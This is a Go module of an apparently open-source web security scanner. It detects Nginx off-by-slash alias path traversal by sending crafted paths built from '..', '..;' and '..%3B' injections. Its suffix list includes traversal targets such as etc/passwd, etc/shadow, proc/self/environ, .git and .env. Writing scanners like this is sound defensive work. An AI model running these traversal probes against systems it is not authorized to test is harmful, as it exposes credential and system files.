package nginx_off_by_slash

import (
	"crypto/md5"
	"fmt"
	"strings"

	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/pkg/errors"
	urlutil "github.com/projectdiscovery/utils/url"
)

type Module struct {
	modkit.BaseActiveModule
	ds         dedup.Lazy[dedup.DiskSet]
	injections []string
	suffixes   []string
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		ds:         dedup.LazyDiskSet("nginx_off_by_slash"),
		injections: []string{"..", "..;", "..%3B"},
		suffixes:   initSuffixes(),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	// Only process GET requests
	var rawHttp []byte
	if ctx.Request().Method() != "GET" {
		rawHttp = infra.SwapToGetMethodRequest(ctx.Request().Raw())
	} else {
		rawHttp = ctx.Request().Raw()
	}

	diskSet := m.ds.Get(scanCtx.DedupMgr())

	// Extract first-level path segment
	segment := firstPathSegment(urlx.Path)
	if segment == "" {
		return results, nil
	}

	// Dedup on host|segment
	checksum := getChecksum(urlx, segment)
	if diskSet != nil && diskSet.IsSeen(checksum) {
		return results, nil
	}

	// For each injection variant, try each suffix
	for _, injection := range m.injections {
		for _, suffix := range m.suffixes {
			// Build traversal path: /{segment}{injection}/{suffix}
			newPath := "/" + segment + injection + "/" + suffix

			modifiedRaw, err := httpmsg.SetPath(rawHttp, newPath)
			if err != nil {
				continue
			}

			fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
			if err != nil {
				continue
			}
			fuzzedReq = fuzzedReq.WithService(ctx.Service())

			resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
			if err != nil {
				if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
					return results, nil
				}
				continue
			}

			statusCode := resp.Response().StatusCode
			body := resp.Body().String()
			resp.Close()

			// Must be 200 with a non-trivial body
			if statusCode != 200 || len(body) < 50 {
				continue
			}

			results = append(results, &output.ResultEvent{
				URL:              urlx.Scheme + "://" + urlx.Host + newPath,
				Request:          string(modifiedRaw),
				Response:         body,
				FuzzingParameter: segment,
				ExtractedResults: []string{injection + "/" + suffix},
				Info: output.Info{
					Description: fmt.Sprintf("Nginx off-by-slash alias traversal via /%s%s/%s", segment, injection, suffix),
				},
			})
			// Stop on first match per injection
			return results, nil
		}
	}

	return results, nil
}

// firstPathSegment extracts the first non-empty path segment from a URL path.
// For "/static/js/app.js" it returns "static".
func firstPathSegment(urlPath string) string {
	parts := strings.Split(strings.TrimPrefix(urlPath, "/"), "/")
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			return p
		}
	}
	return ""
}

func getChecksum(urlx *urlutil.URL, segment string) string {
	return fmt.Sprintf("%x", md5.Sum([]byte(urlx.Host+"|"+segment)))
}

func initSuffixes() []string {
	return []string{
		// Common web directories
		"static", "assets", "uploads", "images", "img", "css", "js",
		"fonts", "media", "files", "content", "resources", "public",
		"dist", "build", "lib", "vendor", "node_modules",
		// Application directories
		"app", "application", "src", "source", "web", "www", "htdocs",
		"html", "templates", "views", "pages", "layouts", "components",
		// Admin / config
		"admin", "administrator", "panel", "dashboard", "config",
		"configuration", "settings", "setup", "install",
		// API
		"api", "api-docs", "swagger", "graphql", "rest", "v1", "v2", "v3",
		// Data / storage
		"data", "database", "db", "backup", "backups", "dump", "export",
		"import", "logs", "log", "tmp", "temp", "cache", "storage",
		// Documentation
		"docs", "doc", "documentation", "help", "wiki", "readme",
		// User content
		"user", "users", "profile", "profiles", "avatar", "avatars",
		"download", "downloads", "upload",
		// Scripts and includes
		"scripts", "includes", "include", "inc", "modules", "plugins",
		"extensions", "addons", "themes", "skins",
		// Common frameworks
		"wp-content", "wp-includes", "wp-admin",
		"sites/default/files", "misc", "core",
		// Misc
		"assets/img", "assets/css", "assets/js", "assets/fonts",
		"static/css", "static/js", "static/img", "static/images",
		"static/media", "static/fonts",
		"public/css", "public/js", "public/images",
		"etc/passwd", "etc/nginx/nginx.conf", "etc/shadow",
		"proc/self/environ", "proc/self/cmdline",
		".git", ".env", "server-status", "server-info",
	}
}
